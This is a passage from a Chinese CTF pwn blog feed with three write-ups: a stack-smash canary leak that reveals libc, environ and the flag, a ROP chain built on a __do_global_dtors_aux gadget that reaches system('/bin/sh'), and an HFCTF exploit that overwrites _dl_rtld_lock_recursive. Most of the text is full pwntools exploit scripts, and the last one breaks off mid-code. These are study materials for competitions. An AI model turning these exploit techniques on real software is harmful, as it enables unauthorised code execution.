class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x7a bytes:</span><br><span class="line">    00000000  59 6f 75 20  73 68 6f 75  6c 64 20 74  61 6b 65 20  │You │shou│ld t│ake │</span><br><span class="line">    00000010  6d 6f 72 65  20 65 66 66  6f 72 74 20  74 6f 20 67  │more│ eff│ort │to g│</span><br><span class="line">    00000020  65 74 20 73  69 78 20 73  65 6e 63 65  2c 20 61 6e  │et s│ix s│ence│, an│</span><br><span class="line">    00000030  64 20 6f 6e  65 20 6d 6f  72 65 20 63  68 61 6c 6c  │d on│e mo│re c│hall│</span><br><span class="line">    00000040  65 6e 67 65  21 21 0a 2a  2a 2a 20 73  74 61 63 6b  │enge│!!·*│** s│tack│</span><br><span class="line">    00000050  20 73 6d 61  73 68 69 6e  67 20 64 65  74 65 63 74  │ sma│shin│g de│tect│</span><br><span class="line">    00000060  65 64 20 2a  2a 2a 3a 20  f8 dc ff ff  ff 7f 20 74  │ed *│**: │····│·· t│</span><br><span class="line">    00000070  65 72 6d 69  6e 61 74 65  64 0a                     │ermi│nate│d·│</span><br><span class="line">    0000007a</span><br><span class="line">stack_addr = 0x7fffffffdcf8</span><br></pre></td></tr></table></figure><p>可在 gdb 中验证该值为正确的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ print environ</span><br><span class="line">$1 = (char **) 0x7fffffffdcf8</span><br><span class="line">gdb-peda$ telescope 0x7fffffffdcf8</span><br><span class="line">0000| 0x7fffffffdcf8 --&gt; 0x7fffffffe0ea (&quot;INSTANCE=&quot;)</span><br><span class="line">0008| 0x7fffffffdd00 --&gt; 0x7fffffffe0f4 (&quot;MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path&quot;)</span><br><span class="line">0016| 0x7fffffffdd08 --&gt; 0x7fffffffe12a (&quot;ALL_PROXY=socks://192.168.239.1:1080/&quot;)</span><br><span class="line">       ...</span><br></pre></td></tr></table></figure><h3 id="3）读取-flag"><a href="#3）读取-flag" class="headerlink" title="3）读取 flag"></a>3）读取 flag</h3><p>查看内存中 flag 的地址为 0x7fffffffdb90，计算该地址与泄露栈地址的偏移量为 0x168（0x7fffffffdcf8 - 0x7fffffffdb90）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ stack 20                                                                                                                                             </span><br><span class="line">0000| 0x7fffffffdb08 --&gt; 0x7ffff7a875e8 (&lt;_IO_new_file_underflow+328&gt;:  cmp    rax,0x0)</span><br><span class="line">0008| 0x7fffffffdb10 --&gt; 0x7ffff7dd3780 --&gt; 0x0 </span><br><span class="line">     ...</span><br><span class="line">0088| 0x7fffffffdb60 --&gt; 0x7fffffffdce8 --&gt; 0x7fffffffe0e2 --&gt; 0x73736575672f2e (&apos;./guess&apos;)</span><br><span class="line">0096| 0x7fffffffdb68 --&gt; 0x100000000 </span><br><span class="line">0104| 0x7fffffffdb70 --&gt; 0x8600000000 </span><br><span class="line">0112| 0x7fffffffdb78 --&gt; 0x3 </span><br><span class="line">0120| 0x7fffffffdb80 --&gt; 0x2 </span><br><span class="line">0128| 0x7fffffffdb88 --&gt; 0x3 </span><br><span class="line">0136| 0x7fffffffdb90 (&quot;flag&#123;43861991f7e943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">     ...</span><br></pre></td></tr></table></figure><p>构造以下 payload，第三次利用栈溢出覆盖 argv[0] 为 flag 的内存地址，从而可读取内存中的 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2 = &apos;A&apos; * 0x128 + p64(stack_addr - 0x168)</span><br></pre></td></tr></table></figure><p>最终获取 flag 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x9b bytes:</span><br><span class="line">    &apos;You should take more effort to get six sence, and one more challenge!!\n&apos;</span><br><span class="line">    &apos;*** stack smashing detected ***: flag&#123;43861991f7e943090e257863eec75961&#125;\n&apos;</span><br><span class="line">    &apos; terminated\n&apos;</span><br><span class="line">You should take more effort to get six sence, and one more challenge!!</span><br><span class="line">*** stack smashing detected ***: flag&#123;43861991f7e943090e257863eec75961&#125;</span><br><span class="line"> terminated</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./guess'</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main_got = <span class="number">0x602048</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(0x400B23)    </span></span><br><span class="line"><span class="comment">#raw_input("leak libc_base")</span></span><br><span class="line">p.recvuntil(<span class="string">'guessing flag\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">0x128</span> + p64(libc_start_main_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'detected ***: '</span>)</span><br><span class="line">libc_start_main_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base_addr = libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc_base_addr = '</span> + hex(libc_base_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input("leak environ_addr")</span></span><br><span class="line">environ_addr = libc_base_addr + libc.symbols[<span class="string">'_environ'</span>]</span><br><span class="line">payload1 = <span class="string">'A'</span> * <span class="number">0x128</span> + p64(environ_addr)</span><br><span class="line">p.recvuntil(<span class="string">'Please type your guessing flag'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'stack smashing detected ***: '</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'stack_addr = '</span> + hex(stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input("leak flag")</span></span><br><span class="line">payload2 = <span class="string">'A'</span> * <span class="number">0x128</span> + p64(stack_addr - <span class="number">0x168</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Please type your guessing flag'</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'&#125;'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><p>References:</p><p><a href="http://0x4c43.cn/2018/1013/stack-overflow-smash-utilization/" target="_blank" rel="noopener">栈溢出 Stack smash 利用</a></p><p><a href="https://www.anquanke.com/post/id/161142#h2-0" target="_blank" rel="noopener">浅析ROP之Stack Smash</a></p><p> <a href="http://tacxingxing.com/2017/12/16/environ/" target="_blank" rel="noopener">Environ</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在 Linux 系统应用程序中部署 Canary 漏洞缓解机制可有效防御栈溢出漏洞的攻击，然而在一定环境下，攻击者可利用该机制泄露内存信息，实现进一步的攻击。&lt;/p&gt;
&lt;h1 id=&quot;利用思路&quot;&gt;&lt;a href=&quot;#利用思路&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>__do_global_dtors_aux的gadget</title>
    <link href="https://nocbtm.github.io/2020/04/21/%C2%96do-global-dtors-aux%E7%9A%84gadget/"/>
    <id>https://nocbtm.github.io/2020/04/21/do-global-dtors-aux的gadget/</id>
    <published>2020-04-21T03:30:39.000Z</published>
    <updated>2020-04-28T16:49:57.831Z</updated>
    
    <content type="html"><![CDATA[<p>_do_global_dtors_aux中有一个gadgets可以修改stack上的数据，以达到可以代替64位的<code>ret2_dl_runtime_resolve</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@--name:/ctf/work/eonew/noleak<span class="comment"># ROPgadget --binary no_leak | grep rbp</span></span><br><span class="line">0x00000000004004b6 : add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000004004b5 : add byte ptr [rax], r8b ; pop rbp ; ret</span><br><span class="line">0x0000000000400517 : add byte ptr [rcx], al ; pop rbp ; ret</span><br><span class="line">0x0000000000400518 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</span><br><span class="line">0x00000000004004a9 : je 0x4004c0 ; pop rbp ; mov edi, 0x601010 ; jmp rax</span><br><span class="line">0x00000000004004eb : je 0x400500 ; pop rbp ; mov edi, 0x601010 ; jmp rax</span><br><span class="line">0x0000000000400512 : mov byte ptr [rip + 0x200af7], 1 ; pop rbp ; ret</span><br><span class="line">0x00000000004004b3 : nop dword ptr [rax + rax] ; pop rbp ; ret</span><br><span class="line">0x00000000004004f5 : nop dword ptr [rax] ; pop rbp ; ret</span><br><span class="line">0x0000000000400515 : or ah, byte ptr [rax] ; add byte ptr [rcx], al ; pop rbp ; ret</span><br><span class="line">0x00000000004004ab : pop rbp ; mov edi, 0x601010 ; jmp rax</span><br><span class="line">0x00000000004005cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005cf : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004004b8 : pop rbp ; ret</span><br></pre></td></tr></table></figure><p><code>0x0000000000400518 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</code> 这个gadget位于</p><p>_do_global_dtors_aux中 只要控制rbp和edx的值就可以任意修改栈上的数据</p><h2 id="no-leak"><a href="#no-leak" class="headerlink" title="no_leak"></a>no_leak</h2><p>栈溢出，没有可泄露的函数，第一感觉是用<code>ret2_dl_runtime_resolve</code>,但尝试之后发现这道题在伪造调用<code>dl_runtime_resolve</code>的时候会跳转到一个未知的地方，而且溢出的字节有点少。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用思路如下:</p><p>1、栈迁移到bss上</p><p>2、调用libc_start_main，使得bss上残留下原本栈的信息，就会有真实地址在bss上分布</p><p>3、找一个能用的真实地址，利用神奇的gadget，把它伪造成system，再次回跳到main函数</p><p>4、栈溢出构造<code>system(&#39;/bin/sh&#39;)</code></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"no_leak"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.27'</span></span><br><span class="line">ip, port = <span class="string">'nc.eonew.cn'</span>, <span class="number">10002</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cus_rop</span><span class="params">(gadget1,gadget2,func_got,rdi,rsi,rdx)</span>:</span></span><br><span class="line">    payload = p64(gadget1)</span><br><span class="line">    payload += p64(<span class="number">0</span>) </span><br><span class="line">    payload += p64(<span class="number">0</span>)         <span class="comment">#rbx=0</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)         <span class="comment">#rbp=1</span></span><br><span class="line">    payload += p64(func_got)  <span class="comment">#r12  call</span></span><br><span class="line">    payload += p64(rdi)       <span class="comment">#r13  rdx </span></span><br><span class="line">    payload += p64(rsi)       <span class="comment">#r14  rsi</span></span><br><span class="line">    payload += p64(rdx)       <span class="comment">#r15  edi </span></span><br><span class="line">    payload += p64(gadget2)</span><br><span class="line">    payload += <span class="string">'\x00'</span>*<span class="number">56</span>      <span class="comment">#tiao zheng zhan zhen</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line">gadget_reg = <span class="number">0x4005C6</span> </span><br><span class="line">gadget_call= <span class="number">0x4005B0</span></span><br><span class="line">magic_gadget = <span class="number">0x400518</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4005D3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4005D1</span></span><br><span class="line">leave_ret = <span class="number">0x400564</span></span><br><span class="line">buf_address = elf.bss() + <span class="number">0x500</span></span><br><span class="line">fini = <span class="number">0x4005E0</span></span><br><span class="line">init = <span class="number">0x400570</span></span><br><span class="line">start = <span class="number">0x400450</span></span><br><span class="line"><span class="comment">#---------------</span></span><br><span class="line">dbg(<span class="number">0x400537</span>)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">'\x00'</span>*<span class="number">0x80</span> + p64(buf_address)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15) + p64(buf_address) + p64(<span class="number">0</span>) + p64(elf.plt[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">8</span></span><br><span class="line">payload += cus_rop(gadget_reg,gadget_call,elf.got[<span class="string">'__libc_start_main'</span>],start,fini,init)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#--------------- </span></span><br><span class="line">pause()</span><br><span class="line">payload  = <span class="string">'\x00'</span>*<span class="number">0x80</span> + p64(buf_address)</span><br><span class="line">payload += p64(<span class="number">0x4005Ca</span>)</span><br><span class="line">payload += p64(<span class="number">0xFFFFFFFFFFC5EE18</span>) <span class="comment">##(-0x3a11e8)^0xffffffffffffffff+1</span></span><br><span class="line">payload += p64(<span class="number">0x601458</span>+<span class="number">0x3d</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p64(magic_gadget)</span><br><span class="line">payload += p64(start)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#--------------- </span></span><br><span class="line">binsh = <span class="number">0x6012b0</span></span><br><span class="line">system = <span class="number">0x601458</span></span><br><span class="line">payload =<span class="string">'/bin/sh\x00'</span>+<span class="string">'b'</span>*<span class="number">0x80</span></span><br><span class="line">payload +=cus_rop(gadget_reg,gadget_call,system,binsh,fini,init)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>修改<code>0x601458</code>处的地址，经过加减得到<code>__libc_system</code></p><p><img alt="" data-src="https://nocbtm.github.io/imgs/aux-1.png" class="lozad"></p><p><img alt="" data-src="https://nocbtm.github.io/imgs/aux-2.png" class="lozad"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;_do_global_dtors_aux中有一个gadgets可以修改stack上的数据，以达到可以代替64位的&lt;code&gt;ret2_dl_runtime_resolve&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;t
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HFCTF pwn witeup</title>
    <link href="https://nocbtm.github.io/2020/04/20/HFCTF-pwn-witeup/"/>
    <id>https://nocbtm.github.io/2020/04/20/HFCTF-pwn-witeup/</id>
    <published>2020-04-20T01:31:03.000Z</published>
    <updated>2020-04-24T02:13:47.864Z</updated>
    
    <content type="html"><![CDATA[<p>虎符2020的线上赛部分Pwn题WP,忘记报名了,只能靠其他师傅要题</p><h2 id="MarkMan"><a href="#MarkMan" class="headerlink" title="MarkMan"></a>MarkMan</h2><p>这个题耗费了太多时间，程序给了puts函数地址,存在一个任意地址写三字节，任意地址尝试了很多地方，刚开始想往stack上写未果，又往<code>dlopen</code>的<code>_dlfcn_hook</code> 上写未果，最终在exit函数会调用<code>_rtld_global</code>结构中的<code>_dl_rtld_lock_recursive</code>或者<code>_dl_rtld_unlock_recursive</code>处改写成功 ，并且因为<code>_dl_rtld_lock_recursive</code>指向的内容距离 <code>libc.address</code>过大，修改后三字节只会有几率成功</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level   = 'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p = process(<span class="string">'./chall'</span>)</span><br><span class="line"><span class="comment">#p=remote('39.97.210.182',10055)</span></span><br><span class="line">elf=ELF(<span class="string">'./chall'</span>)</span><br><span class="line"><span class="comment">#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">libc=ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">one = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line"><span class="comment">#gdb.attach(p,"b *$rebase(0xcbc)\nb *$rebase(0xcc1)\nb *$rebase(0xd63)\n")</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"target near: 0x"</span>)</span><br><span class="line">leak=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc.address = leak - libc.sym[<span class="string">"puts"</span>]</span><br><span class="line">success(<span class="string">'leak =&gt; &#123;0&#125;'</span>.format(hex(leak)))</span><br><span class="line">success(<span class="string">'libc_address =&gt; &#123;0&#125;'</span>.format(hex(libc.address)))</span><br><span class="line"></span><br><span class="line">dlfcn_hook=libc.address+(<span class="number">0x15555532d0a0</span><span class="number">-0x155554d60000</span>)</span><br><span class="line">dl_rtld_lock_recursive=libc.address+(<span class="number">0x7f8a645fbf60</span><span class="number">-0x7f8a63dde000</span>)</span><br><span class="line">success(<span class="string">'dl_rtld_lock_recursive =&gt; &#123;0&#125;'</span>.format(hex(dl_rtld_lock_recursive)))</span><br><span class="line">success(<span class="string">'dlfcn_hook =&gt; &#123;0&#125;'</span>.format(hex(dlfcn_hook)))</span><br><span class="line">p.sendline(str(int(dl_rtld_lock_recursive)))</span><br><span class="line"></span><br><span class="line">payload=libc.address+one[<span class="number">1</span>]</span><br><span class="line">info(hex(payload))</span><br><span class="line">yi=payload&amp;<span class="number">0xff</span></span><br><span class="line">er=(payload&amp;<span class="number">0xffff</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">san=(payload&amp;<span class="number">0xffffff</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line">info(hex(yi))</span><br><span class="line">info(hex(er))</span><br><span class="line">info(hex(san))</span><br><span class="line">p.recvuntil(<span class="string">'biang!\n'</span>)</span><br><span class="line">p.sendline(p8(yi))</span><br><span class="line">p.recvuntil(<span class="string">'biang!\n'</span>)</span><br><span class="line">p.sendline(p8(er))</span><br><span class="line">p.recvuntil(<span class="string">'biang!\n'</span>)</span><br><span class="line">p.sendline(p8(san))</span><br><span class="line">p.sendline(<span class="string">"cat flag*"</span>)</span><br><span class="line">con=p.recv()</span><br><span class="line"><span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> con:</span><br><span class="line"><span class="keyword">print</span> con</span><br><span 